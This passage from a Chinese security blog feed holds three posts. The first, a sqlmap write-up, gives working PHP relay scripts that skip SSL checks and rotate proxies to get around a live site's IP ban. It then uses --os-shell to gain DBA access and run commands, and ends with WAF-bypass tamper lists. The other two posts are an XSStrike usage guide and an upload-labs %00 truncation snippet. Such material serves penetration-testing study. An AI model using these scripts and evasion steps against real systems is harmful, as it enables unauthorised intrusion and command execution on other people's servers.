/2021-10-10/</span><br><span class="hljs-string">[10.12.10] [INFO] parsing HTTP request from &#x27;</span>49<span class="hljs-string">&#x27;</span><br><span class="hljs-string">custom injection marking character (&#x27;</span>*<span class="hljs-string">&#x27;) found in option &#x27;</span>--data<span class="hljs-string">&#x27;. Do you want to process it?  [Y/n/q]Y</span><br><span class="hljs-string">[10:12:10] [INFO] testing connection to the target URL</span><br><span class="hljs-string">[10:12:10] [CRITICAL] can&#x27;</span>t establish SSL connection<br></code></pre></td></tr></table></figure><p>一看无法建立SSL连接，好不容易发现一个注入点，难道就这样放弃了吗？先百度一波，看看SSL证书原理，就用一张图来理解更直接明了。</p><p><img src="/.com//image-20250519105507-ukeg78l.png" alt="image">​</p><p>那么遇到这样的情况要怎么绕呢？在sqlmap中没有<strong>绕过SSL证书的参数</strong>，思考了很长时间，终于想起来原来貌似有一个<strong>中转注入</strong>。这里要解决的第一个问题是<strong>有哪些脚本语言</strong>能够在<strong>请求网址时忽略SSL证书</strong>，第二个问题是我还需要使用sqlmap中的payload，这两个都要满足，通过查询了解到<strong>PHP可以使用参数来忽略SSL证书</strong>，由于并不是搞开发的，所以这里还是思考了很长时间，先来理解一下中转注入的原理吧。</p><h2 id="中转注入的原理"><a href="#中转注入的原理" class="headerlink" title="中转注入的原理"></a>中转注入的原理</h2><p>首先我们我们来分析一下sqlmap中转注入的原理，如下图：</p><p><img src="/.com//image-20250519105817-iacne5p.png" alt="image"></p><p>为了让大家更加容易解，先使用简单的脚本演示一遍，演示代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<span class="hljs-comment">//对中转脚本接收的参数进行base64编码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span><br><span class="hljs-variable">$urls</span>=<span class="hljs-string">&quot;http://xxx/xxxx?q=1<span class="hljs-subst">$payload</span>&quot;</span>;<span class="hljs-comment">//对请求的网址拼接base64编码的字符串</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$urls</span>);<span class="hljs-comment">//请求目标网站</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$urls</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>网上随便找需一个后面有参数的网站，添加到$urls变量中，将上述代码放在本地服务器中，然后访问，可以看到成功请求到我们添加的网站</p><p><img src="/.com//image-20250519105913-j8otsss.png" alt="image"></p><p>使用sqlmap跑一下,设置一下代理使用burp来抓包</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://127.0.0.1/zhongzhuan.php?x=1&quot;</span>  -v <span class="hljs-number">3</span> <span class="hljs-attr">--proxy</span>=http:<span class="hljs-comment">//127.0.0.1:8080</span><br></code></pre></td></tr></table></figure><p>成功看到各种payload</p><p><img src="/.com//image-20250519105939-j5atbu9.png" alt="image">​</p><p><img src="/.com//image-20250519105942-idplwtr.png" alt="image">​</p><p>burp抓包的结果</p><p><img src="/.com//image-20250519110013-trheljz.png" alt="image"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>set_time_limit(0); <br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]; <br><span class="hljs-variable">$id</span>=str_replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;/**/&quot;</span>,<span class="hljs-variable">$id</span>); <br><span class="hljs-variable">$id</span>=str_replace(<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;%3D&quot;</span>,<span class="hljs-variable">$id</span>); //这些编码机制可以自己的需求设定，毕竟实战的环境变换多样<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://xxxx?&amp;daxxtae=null&amp;parame=<span class="hljs-variable">$id</span>&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$url</span>;<br><span class="hljs-variable">$ch</span> = curl_init(); <br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-string">&quot;<span class="hljs-variable">$url</span>&quot;</span>); <br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值  <br><span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>); <br>curl_close(<span class="hljs-variable">$ch</span>); <br>print_r(<span class="hljs-variable">$output</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>此时中转脚本已经写好了，用sqlmap跑，没想到呀，既然<strong>流量有限制</strong>，就算请求延迟调得很慢，还是直接将我的ip给封了，此时又是一个漫长的过程，又要继续思考了，在sqlmap中有代理设置参数，哈哈哈这都知道，但是试了试一试不可以，一直思考呀，首先我们借助了中转脚本，先请求的是我们的本地服务器，你说外网的代理服务器直接访问我本地服务器这是一个不现实的问题，最主要是我没有公网服务器，不然就好办了，所以现在需要思考两个问题，首先我要用到中转脚本过证书问题，还要能够使用代理，在PHP代码上使用代理池设置。此时sqlmap先请求我们中转脚本（并没有用代理地址），中转脚本借助设置的代理地址迟访问目标网页。<br>现在代码修改成了如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>); <br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]; <br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;%20&quot;</span>,<span class="hljs-variable">$id</span>); <br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;%3D&quot;</span>,<span class="hljs-variable">$id</span>); <br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://xxxx?&amp;daxxtae=null&amp;parame=<span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-string">&quot;<span class="hljs-subst">$url</span>&quot;</span>); <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_PROXY, <span class="hljs-string">&#x27;proxy.xxxx.com&#x27;</span>); <span class="hljs-comment">//代理服务器地址</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_PROXYPORT, <span class="hljs-string">&#x27;8080&#x27;</span>); <span class="hljs-comment">//代理服务器端口</span><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在使用sqlmap跑的时候最好先本地测试一下，经过了20多分钟的扫描终于算是出东西了</p><p><img src="/.com//image-20250519110300-nyf9oiz.png" alt="image"></p><p>直接看一下能否写shell，搞个高危，运气就是这么好</p><p>​<code>python2 sqlmap.py -u &quot;http://xxxx?&amp;daxxtae=null&amp;param=xxx&quot; --batch --delay=1 --random-agent --os-shell</code>​</p><p>成功拿到了dba权限</p><p><img src="/.com//image-20250519110715-qe4ru0n.png" alt="image">​</p><p>成功执行命令，不过是真的慢，可能是有防护软件原因吧。</p><p><img src="/.com//image-20250519110742-cmuyky0.png" alt="image">​</p><p>在这里问题又来了，要是post型注入又该怎么办呢？上面的脚本似乎不在使用思考了很长时间，但是也没有在实际中遇到，所以这里就想本地尝试一次。</p><h1 id="post型中转注入"><a href="#post型中转注入" class="headerlink" title="post型中转注入"></a>post型中转注入</h1><p>在注入天书中有post型注入，随便选了一个11关卡，抓取less-11关的包，注入点在登录框这里。</p><p><img src="/.com//image-20250519110755-7sxmsol.png" alt="image">​</p><p>注入点为</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">uname</span><span class="hljs-operator">=</span>admin<span class="hljs-variable">&amp;passwd</span>=hhh<span class="hljs-variable">&amp;submit</span>=Submit<br></code></pre></td></tr></table></figure><p>构造中转脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://192.168.1.104/sqli/Less-11/index.php&quot;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-variable">$_GET</span>[s];<span class="hljs-comment">//获取中转脚本传过来的payload </span><br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$params</span> = <span class="hljs-string">&quot;uname=admin<span class="hljs-subst">$s</span>&amp;passwd=aa&quot;</span>;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">// 创建一个新cURL资源</span><br> <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//这是你想用PHP取回的URL地址，可以在用curl_init()函数初始化时设置这个选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>); <span class="hljs-comment">// https请求 不验证证书</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);<span class="hljs-comment">//https请求 不验证hosts</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<span class="hljs-comment">//如果你想把一个头包含在输出中，设置这个选项为一个非零值   </span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_USERAGENT, <span class="hljs-string">&#x27;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;</span>);<span class="hljs-comment">// 在HTTP请求中自定义一个”user-agent”头的字符串</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_TIMEOUT, <span class="hljs-number">15</span>);<span class="hljs-comment">//为了应对目标服务器的过载，下线，或者崩溃等可能状况。</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_POST, <span class="hljs-number">1</span>);    <span class="hljs-comment">// post 提交方式</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$params</span>);<br><span class="hljs-comment">// 抓取URL并把它传递给浏览器 </span><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">// 关闭cURL资源，并且释放系统资源</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-comment">//echo $a;</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">2846</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用sqlmap进行注入</p><p><img src="/.com//image-20250519110828-p0favmb.png" alt="image"></p><p>首先注入我们的中转脚本</p><p><img src="/.com//image-20250519110836-i2fb0fc.png" alt="image"></p><p>中转脚本通过获取的payload请求目标网站</p><p><img src="/.com//image-20250519110843-hjlrfhm.png" alt="image"></p><p>成功跑出数据库</p><p><img src="/.com//image-20250519110854-nljxinj.png" alt="image">​</p><p>‍</p><h1 id="sqlmap绕过WAF的思路总结"><a href="#sqlmap绕过WAF的思路总结" class="headerlink" title="sqlmap绕过WAF的思路总结"></a>sqlmap绕过WAF的思路总结</h1><p><strong>1、设置请求头</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">--user-agent=<span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;</span><br></code></pre></td></tr></table></figure><p><strong>2、设置代理</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--proxy</span>=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p><strong>3、设置延迟</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--delay</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><strong>4、利用–tamper参数中的编码脚本</strong><br>常见编码搭配方式<br>普通tamper搭配方式:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tamper</span>=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes<br></code></pre></td></tr></table></figure><p>数据库为MYSQL的搭配方式:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tamper</span>=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes<br></code></pre></td></tr></table></figure><p>数据库为MySql的搭配方式:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tamper</span>=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor<br></code></pre></td></tr></table></figure><p><strong>5、自己编写中转脚本</strong></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>工具使用</category>
      
      <category>sqlmap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>绕过WAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用教程</title>
    <link href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <url>/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h1><h3 id="扫描单个网址"><a href="#扫描单个网址" class="headerlink" title="扫描单个网址"></a>扫描单个网址</h3><blockquote><p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“</p></blockquote><h3 id="测试-URL-路径组件"><a href="#测试-URL-路径组件" class="headerlink" title="测试 URL 路径组件"></a>测试 URL 路径组件</h3><p>选项：–path</p><p>在 URL 路径中注入有效负载</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/search/form/query">http://example.com/search/form/query</a>“ –path</p></blockquote><h3 id="将-POST-数据视为-JSON"><a href="#将-POST-数据视为-JSON" class="headerlink" title="将 POST 数据视为 JSON"></a>将 POST 数据视为 JSON</h3><p>选项：–json</p><p>该开关可用于通过 POST 方法测试 JSON 数据</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/search.php">http://example.com/search.php</a>“ –data ‘{“q”:”query”}’ –json</p></blockquote><h3 id="爬行"><a href="#爬行" class="headerlink" title="爬行"></a>爬行</h3><p>选项：–crawl</p><p>从目标网页开始抓取目标并进行测试</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl</p></blockquote><p><img src="/.com//image-20250520022958-fyivqpz.png" alt="image"></p><h3 id="爬行深度"><a href="#爬行深度" class="headerlink" title="爬行深度"></a>爬行深度</h3><p>选项：-l（默认为 2）</p><p>此选项允许您指定爬网的深度</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl -l 3</p></blockquote><h3 id="从文件中测试-抓取-URL"><a href="#从文件中测试-抓取-URL" class="headerlink" title="从文件中测试&#x2F;抓取 URL"></a>从文件中测试&#x2F;抓取 URL</h3><p>选项：–seeds</p><blockquote><p>python xsstrike.py –seeds urls.txt</p><p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -l 3 –seeds urls.txt</p></blockquote><h3 id="从文件中暴力破解有效负载"><a href="#从文件中暴力破解有效负载" class="headerlink" title="从文件中暴力破解有效负载"></a>从文件中暴力破解有效负载</h3><p>选项：-f</p><p>您可以从文件加载有效负载并检查它们是否有效</p><blockquote><p>python3 xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -f &#x2F;path&#x2F;to&#x2F;file.txt</p></blockquote><h3 id="线程数"><a href="#线程数" class="headerlink" title="线程数"></a>线程数</h3><p>选项：-t</p><p>在爬行时可以向目标发出并发请求，并且-t可以使用选项来指定要发出的并发请求的数量。虽然线程可以帮助加快爬行速度，但它们也可能会触发安全机制。大量线程也会导致小型网站瘫痪</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -t 10 –crawl -l 3</p></blockquote><h3 id="暂停"><a href="#暂停" class="headerlink" title="暂停"></a>暂停</h3><p>选项：–timeout（默认为 7）</p><p>可以指定在考虑 HTTP(S) 请求超时之前等待的秒数</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ –timeout=4</p></blockquote><h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h3><p>选项：-d</p><p>可以指定每个 HTTP(S) 请求之间保持的秒数。有效值为 int，例如 1 表示秒</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -d 2</p></blockquote><h3 id="提供-HTTP-标头"><a href="#提供-HTTP-标头" class="headerlink" title="提供 HTTP 标头"></a>提供 HTTP 标头</h3><p>选项：–headers</p><p>简单地从命令行添加标头，并用 \n 以下分隔符分隔</p><blockquote><p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –headers “Accept-Language: en-US\nCookie: null”</p></blockquote><h3 id="盲目跨站"><a href="#盲目跨站" class="headerlink" title="盲目跨站"></a>盲目跨站</h3><p>选项：–blind</p><p>在爬行时使用此选项将使 XSStrike 注入您定义的盲 XSS 有效负载 <code>core/config.py</code>​，以将其注入到每个 HTML 表单的每个参数中</p><blockquote><p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –crawl –blind</p></blockquote><h3 id="有效负载编码"><a href="#有效负载编码" class="headerlink" title="有效负载编码"></a>有效负载编码</h3><p>选项：-e</p><p>XSStrike 可以按需对有效负载进行编码。目前支持 base64 编码</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -e base64</p></blockquote><h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>选项：–fuzzer</p><p>模糊器旨在测试过滤器和 Web 应用程序防火墙。它非常慢，因为它随机发送*延迟请求，并且延迟可能长达 30 秒。要最小化延迟，请使用<code>-d</code>​选项将延迟设置为 1 秒</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –fuzzer</p></blockquote><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>选项： –proxy（默认 0.0.0.0:8080）</p><p>您必须设置您的代理（y|ies）core&#x2F;config.py，然后您可以–proxy随时使用开关来使用它们</p><h3 id="跳过确认提示"><a href="#跳过确认提示" class="headerlink" title="跳过确认提示"></a>跳过确认提示</h3><p>选项：–skip</p><p>如果您希望 XSStrike 在找到工作负载时继续扫描而不询问您是否要继续扫描，那么您可以使用此选项。它还会跳过 POC 生成</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip</p></blockquote><h3 id="跳过-DOM-扫描"><a href="#跳过-DOM-扫描" class="headerlink" title="跳过 DOM 扫描"></a>跳过 DOM 扫描</h3><p>选项：–skip-dom</p><p>您可能希望在爬行时跳过 DOM XSS 扫描以节省时间</p><blockquote><p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip-dom</p></blockquote><p><img src="/.com//image-20250520023134-ibwla1x.png" alt="image"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>工具使用</category>
      
      <category>xsstrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>使用教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>%00截断</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%2500%E6%88%AA%E6%96%AD/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%2500%E6%88%AA%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>都表示为空,加了这个空字符的话，会将后面的字符截断不显示</p><p> 